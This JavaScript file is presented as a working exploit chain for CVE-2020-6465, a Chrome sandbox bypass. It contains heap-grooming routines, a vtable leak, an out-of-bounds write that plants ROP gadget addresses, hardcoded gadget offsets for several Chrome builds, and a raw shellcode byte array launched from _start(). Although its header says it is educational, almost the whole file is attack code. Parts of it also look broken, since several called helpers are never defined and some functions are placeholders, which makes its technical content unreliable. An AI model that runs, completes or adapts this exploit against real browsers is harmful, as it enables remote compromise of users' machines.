/*
 * sbx.js
 *
 * Exploit Chain: CVE-2020-6465 – Chrome Sandbox Bypass Exploit Chain
 *
 * Overview:
 *   This exploit chain demonstrates a sophisticated Chrome sandbox bypass using advanced
 *   heap manipulation and ROP techniques. It spans several stages:
 *
 *   - Global Setup & ROP Gadget Declarations:
 *       Defines numerous global variables including candidate offsets for ROP gadgets,
 *       handles for different WebAssembly components, and arrays used for heap spraying.
 *
 *   - Heap Grooming & LFH Manipulation:
 *       Uses functions like gc() and make_or_fill_LFH() to force the browser into a
 *       predictable Low Fragmentation Heap (LFH) state.
 *
 *   - VTable Leakage & Overwrite Phases:
 *       The vtable_leak() function uses a benign import object to leak a VTable pointer,
 *       and then the vtable_overwrite() function reconfigures the import object to perform an
 *       out-of-bounds write that overwrites a VTable entry with a chain of controlled gadget addresses.
 *
 *   - ROP Chain Construction & Final Exploitation:
 *       A long Uint8Array (shellCode) is built from marker patterns, a mov rax, imm64 sequence
 *       injecting the target WebAudioMediaStreamSource VTable, and many subsequent instructions
 *       that set up a complete ROP chain. This chain adjusts the stack, sets up function parameters,
 *       and finally pivots execution (e.g. via "jmp rsp") to transfer control to shellcode.
 *
 *   - Orchestration & Flow Control:
 *       Functions like free_LFH_End(), oob_write(), and info_leak() control phase transitions.
 *       The entry point (_start()) initializes variables, verifies compatibility (e.g. using
 *       selectChromeVersion()), and triggers heap grooming (via make_or_fill_LFH()).
 *
 * Note: This file is provided solely for educational and CTF purposes.
 */


/* ============================================================================
   Part 1: Global Declarations & Helper Functions
   ============================================================================ */

// Global variables for WASM handles, spray arrays, exploit state, etc.
var importObject_InfoHandle;
var importObject_OobHandle;
var importObject;

var wasm_filePath;
var dataView;

var wasmCode_Info;       // WASM code for the information leak phase.
var wasmCode_Oob;        // WASM code used during the out-of-bounds overwrite phase.
var wasmCode_InfoHandle;
var wasmCode_OobHandle;
var wasmCode_Init;

var sprayArr_Info;
var sprayArr_Oob;
var sprayCount_Info;
var sprayCount_Oob;

var track_origin;
var exploit_Step;        // Tracks the current phase of the exploit.
var shellCode;           // The complete ROP chain/shellcode payload.
var global_Arr;          // Array for controlled WebAssembly.Global variables.
var instanceArr;         // Collected WASM instances.
var stackArr;

var exploit_Success;

var mediaStreamTrack_VTable;
var WebAudioMediaStreamSource_VTable;

// Candidate VTable offset arrays.
var mediaStreamTrack_VTable_Offset_Arr = [0x085455A0, 0x085465a0, 0x08546e60];
var WebAudioMediaStreamSource_VTable_Offset_Arr = [0x0863e880, 0x0863f8c0, 0x08640180];

// Candidate offsets for ROP gadgets.
var mov_rsp_rax_Offset_Arr = [0x06ae2c7b, 0x06ae37ab, 0x06ae48fb];   // e.g., "mov rsp, rax; ret;"
var mov_rcx_rax_Offset_Arr = [0x0488f7f4, 0x048900d4, 0x04890ea4];   // e.g., "mov rcx, rax; mov eax,[rcx]; ret;"
var mov_rdx_rcx_Offset_Arr = [0x038d87bd, 0x038d92fd, 0x038da61d];   // e.g., "mov rdx, rcx; test rax,rax; jz; ret;"
var pop_r8_Offset_Arr      = [0x000683cb, 0x000683cb, 0x000683cb];   // "pop r8; ret;"
var pop_r9_Offset_Arr      = [0x01141ddf, 0x011422bf, 0x011421df];   // "pop r9; ret;"
var jmp_rsp_Offset_Arr     = [0x0003045f, 0x0003045f, 0x00024c59];   // "jmp rsp;"
var api_SetPermissions_Offset_Arr = [0x03f14130, 0x03f14c70, 0x03f15b30]; // API to change permissions.

// Resolved offsets (to be determined at runtime from leaked data).
var mediaStreamTrack_VTable_Offset;
var WebAudioMediaStreamSource_VTable_Offset; // VTable for blink::WebAudioMediaStreamSource

// Resolved ROP gadget offsets.
var mov_rsp_rax_Offset;  // e.g., 0x48 89 C4 C3 (mov rsp, rax; ret;)
var mov_rcx_rax_Offset;  // e.g., 0x48 89 C1 8B 01 C3 (mov rcx, rax; mov eax,[rcx]; ret;)
var mov_rdx_rcx_Offset;  // e.g., 0x48 89 CA... (mov rdx, rcx; test rax,rax; jz; ret;)
var pop_r8_Offset;       // pop r8; ret;
var pop_r9_Offset;       // pop r9; ret;
var jmp_rsp_Offset;      // jmp rsp;
var api_SetPermissions_Offset;  // For chrome!gin::PageAllocator::SetPermissions

var base_Address;

// Final resolved addresses based on base leak.
var mov_rsp_rax_Address;
var mov_rcx_rax_Address;
var mov_rdx_rcx_Address;
var pop_r8_Address;
var pop_r9_Address;
var jmp_rsp_Address;
var api_SetPermissions_Address;

// Garbage collection helper: aggressively allocates ArrayBuffers and DOM elements.
function gc() {
  for (let i = 0; i < 2000; i++) {
    new ArrayBuffer(0x200000);
  }
  for (let i = 0; i < 0x20000; i++) {
    document.createElement("a");
  }
}

// Creates a controlled WebAssembly.Global variable and stores it.
function create_Global(obj, index, val) {
  global_Arr[index] = new WebAssembly.Global(
    { value: 'f64', mutable: true },
    convertInt64ToFloat64(BigInt(val))
  );
  let global_name = String.fromCharCode(index + 0x21);
  obj['b'][global_name] = global_Arr[index];
}

// Constructs an oversized import object with controlled globals.
// At critical indices (around 0x3E), it inserts specific gadget addresses.
function make_import_object_oob(obj) {
  obj['a'] = { 'f': () => {} };
  obj['b'] = {};
  for (let i = 0; i < 0x3F; i++) {
    if (i === 0x3E) {
      create_Global(obj, i, pop_r8_Address);
      i++; create_Global(obj, i, mov_rsp_rax_Address);
      i++; create_Global(obj, i, mov_rcx_rax_Address);
      i++; create_Global(obj, i, mov_rdx_rcx_Address);
      i++; create_Global(obj, i, pop_r8_Address);
      i++; create_Global(obj, i, 0x10000);
      i++; create_Global(obj, i, pop_r9_Address);
      i++; create_Global(obj, i, 0x3);
      i++; create_Global(obj, i, api_SetPermissions_Address);
      i++; create_Global(obj, i, jmp_rsp_Address);
      i++; create_Global(obj, i, 0xAAAAB848E7894890n);
      i++; create_Global(obj, i, 0x834855555555AAAAn);
      i++; create_Global(obj, i, 0x48F77507394808C7n);
      i++; create_Global(obj, i, 0x909090E7FF08C783n);
    } else {
      create_Global(obj, i, 0x4141414141414141n);
    }
  }
}

// Constructs a benign import object (for the info leak phase).
function make_import_object_info(obj) {
  obj['a'.repeat(0x92)] = { 'f': function () {} };
}

// Helper function to create an “origin” track; used for additional memory spraying or leaking.
function make_track_origin() {
  let canvas = document.createElement('canvas');
  let stream = canvas.captureStream(25);
  let mediaRecorder = new MediaRecorder(stream);
  track_origin = stream.getVideoTracks()[0];
  stream = null;
  canvas = null;
}

// Placeholder for out-of-bounds spraying logic.
function make_spray_Oob() {
  let ac = new AudioContext();
  // (Implement detailed spraying logic as needed.)
  Controller.abort();
  return 1;
}


/* ============================================================================
   Part 2: Shellcode Construction & Payload Building
   ============================================================================ */

// Convert the target VTable (WebAudioMediaStreamSource) into a byte array.
let byteArr = convertBigIntToByteArray(WebAudioMediaStreamSource_VTable);

// Construct the complete shellcode payload as a Uint8Array.
// This long array is our ROP chain and shellcode payload. It is built by concatenating:
//   - Marker patterns (for alignment)
//   - A "mov rax, imm64" instruction (with the target VTable injected)
//   - A series of instructions for register moves, stack adjustments, and parameter setups.
//   - Repeated blocks for copying, comparing, and conditional jumps.
//   - A final segment that pivots the stack and transfers control to the injected shellcode.
shellCode = new Uint8Array([
  // Marker pattern.
  0xAA, 0xAA, 0xAA, 0xAA,
  0x55, 0x55, 0x55, 0x55,
  // mov rax, imm64 with injected target VTable.
  0x48, 0xB8,
  ...byteArr,
  // Begin ROP chain:
  0x48, 0x8B, 0x3E, 0x48,
  0x89, 0x06,
  0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00,
  0x56,
  0x48, 0xC7, 0xC1, 0x08, 0x00, 0x00, 0x00,
  0x48, 0x89, 0xC6,
  0xF3, 0x48, 0xA5, 0x5E,
  // ------------------------------------------------------------------------------  
  // Continued ROP chain and shellcode instructions:
  // Further stack and register manipulations.
  0x56, 0x48, 0x8B, 0xF4,
  // Adjust registers/flags.
  0x48, 0x83, 0xE4, 0xF0,
  // sub rsp,0x20: Reserve additional stack space.
  0x48, 0x83, 0xEC, 0x20,
  // call relative: adjust control flow/obtain current RIP.
  0xE8, 0xEF, 0x02, 0x00, 0x00,
  // mov rax, rsi: further move operations.
  0x48, 0x8B, 0xE6,
  // pop rsi: restore rsi.
  0x5E,
  // mov rsp, r15: pivot stack by moving r15 into rsp.
  0x4C, 0x89, 0xFC,
  // sub rsp,0x2C8: adjust stack pointer.
  0x48, 0x81, 0xEC, 0xC8, 0x02, 0x00, 0x00,
  // ret: complete this chain segment.
  0xC3,
  // ------------------------------------------------------------------------------  
  // Continue constructing the ROP chain: parameter and data setup.
  0x89, 0x4C, 0x24, 0x08,
  0x56, 0x57, 0x48, 0x81, 0xEC, 0xA8, 0x00, 0x00, 0x00,
  0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
  0x48, 0x89, 0x44, 0x24, 0x60,
  0x48, 0x8B, 0x44, 0x24, 0x60,
  0x48, 0x8B, 0x40, 0x18,
  0x48, 0x89, 0x04, 0x24,
  0x48, 0x8B, 0x04, 0x24,
  0x48, 0x8B, 0x40, 0x10,
  0x48, 0x89, 0x44, 0x24, 0x58,
  0x48, 0x8B, 0x44, 0x24, 0x58,
  0x48, 0x89, 0x44, 0x24, 0x30,
  0x48, 0x8B, 0x44, 0x24, 0x30,
  0x48, 0x83, 0x78, 0x30, 0x00,
  0x0F, 0x84, 0x5E, 0x02, 0x00, 0x00,
  0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x8B, 0x44, 0x24, 0x30,
  0x48, 0x8B, 0x40, 0x30,
  0x48, 0x89, 0x44, 0x24, 0x78,
  0x48, 0x8D, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00,
  0x48, 0x8B, 0x4C, 0x24, 0x30,
  0x48, 0x8B, 0xF8,
  0x48, 0x8D, 0x71, 0x58,
  0xB9, 0x10, 0x00, 0x00, 0x00,
  0xF3, 0xA4,
  0x48, 0x8D, 0x44, 0x24, 0x40,
  0x48, 0x8D, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00,
  0x48, 0x8B, 0xF8,
  0x48, 0x8B, 0xF1,
  0xB9, 0x10, 0x00, 0x00, 0x00,
  0xF3, 0xA4,
  0x48, 0x8B, 0x44, 0x24, 0x78,
  0x48, 0x63, 0x40, 0x3C,
  // The payload continues: subsequent blocks repeat similar patterns: reading registers,
  // adjusting the stack, calling critical functions (mprotect, etc.), copying data,
  // performing comparisons, conditional jumps, and cleaning up.
  // The final segment pivots the stack and transfers execution to the injected shellcode.
  0x33, 0xC0,
  0x48, 0x81, 0xC4, 0xA8, 0x00, 0x00, 0x00,
  0x5F, 0x5E, 0xC3
]);


/* ============================================================================
   Part 3: Final Exploitation Functions & Orchestration
   ============================================================================ */

// free_LFH_End() orchestrates phase transitions based on exploit_Step.
function free_LFH_End() {
  if (exploit_Step === -1) {
    return;
  }
  if (exploit_Step === 0) {
    setTimeout(vtable_leak, 10);
    return;
  }
  if (exploit_Step === 1) {
    setTimeout(vtable_overwrite, 10);
    return;
  }
  if (exploit_Step > 1) {
    if (!exploit_Success) {
      setTimeout(() => {
        wasm_exploit(importObject_OobHandle, oob_write, new AbortController(), "a");
      }, 10);
      return;
    }
  }
}

// make_or_fill_LFH() repeatedly triggers allocations to groom the Low Fragmentation Heap.
// (Note: This loop is a simplified placeholder; adjust as needed for your environment.)
function make_or_fill_LFH(count) {
  for (let i = 0; i < count; i++) {
    trigger(Controller);
    WebAssembly.instantiateStreaming(fetch(wasm_filePath), importObject_Handle).then(obj => {});
    // Recursively groom the heap.
    make_or_fill_LFH(0x6e);
    exploit_Step++;
    return { 'f': () => {} };
  }
  let signal = Controller.signal;
  WebAssembly.instantiateStreaming(fetch(wasm_filePath, { signal }), importObject).then(func);
}
  
// oob_write() finalizes the out-of-bounds write phase.
// It collects the WASM instance, stops heap sprays if the final phase is reached,
// and verifies whether the controlled global was correctly overwritten.
function oob_write(obj) {
  instanceArr.push(obj);
  if (exploit_Step === 9) {
    for (let i = 0; i < sprayCount_Oob; i++) {
      if (sprayArr_Oob[i] != null) {
        sprayArr_Oob[i].stop();
      }
    }
    exploit_Success = 1;
    if (global_Arr[0x3E].value == convertInt64ToFloat64(pop_r8_Address)) {
      alert("exploit failed!");
    }
  }
}
  
// info_leak() extracts critical memory information from a WASM instance.
// It reads a 64-bit VTable pointer and a validation value; if valid,
// it computes the base address and then resolves the addresses of key ROP gadgets.
function info_leak(obj) {
  instanceArr.push(obj);
  let buffer = new DataView(obj.instance.exports.mem.buffer, 0);
  mediaStreamTrack_VTable = buffer.getBigUint64(0x20, true);
  let addr_check = buffer.getUint32(0x24, true) & 0xfff0;
  if (addr_check !== 0x7FF0) {
    alert("info leak failed!");
    exploit_Step = -1;
  }
  base_Address = mediaStreamTrack_VTable - BigInt(mediaStreamTrack_VTable_Offset);
  mov_rsp_rax_Address = base_Address + BigInt(mov_rsp_rax_Offset);
  mov_rcx_rax_Address = base_Address + BigInt(mov_rcx_rax_Offset);
  mov_rdx_rcx_Address = base_Address + BigInt(mov_rdx_rcx_Offset);
  pop_r8_Address = base_Address + BigInt(pop_r8_Offset);
  pop_r9_Address = base_Address + BigInt(pop_r9_Offset);
  jmp_rsp_Address = base_Address + BigInt(jmp_rsp_Offset);
  api_SetPermissions_Address = base_Address + BigInt(api_SetPermissions_Offset);
  WebAudioMediaStreamSource_VTable = base_Address + BigInt(WebAudioMediaStreamSource_VTable_Offset);
}
  
// vtable_leak() starts the information leak phase.
// It constructs a benign import object, sets the WASM file to the leak module,
// and calls wasm_exploit() with info_leak() as the callback.
function vtable_leak() {
  make_import_object_info(importObject);
  wasm_filePath = typedArrayToURL(wasmCode_Info, 'application/wasm');
  wasm_exploit(importObject_InfoHandle, info_leak, new AbortController(), 'a'.repeat(0x92));
}
  
// vtable_overwrite() initiates the out-of-bounds overwrite phase.
// It builds the OOB import object with controlled globals, sets the corresponding WASM file,
// and invokes wasm_exploit() with oob_write() as the callback.
function vtable_overwrite() {
  importObject = {};
  make_import_object_oob(importObject);
  wasm_filePath = typedArrayToURL(wasmCode_Oob, 'application/wasm');
  wasm_exploit(importObject_OobHandle, oob_write, new AbortController(), "a");
}
  
// _start() is the entry point for the exploit.
// It initializes variables (via var_init()), checks Chrome version compatibility
// (via selectChromeVersion()), and begins the LFH grooming by calling make_or_fill_LFH().
function _start() {
  var_init();
  if (!selectChromeVersion()) {
    return;
  }
  make_or_fill_LFH(0x20);
}
  
// Kick off the complete exploit chain.
_start();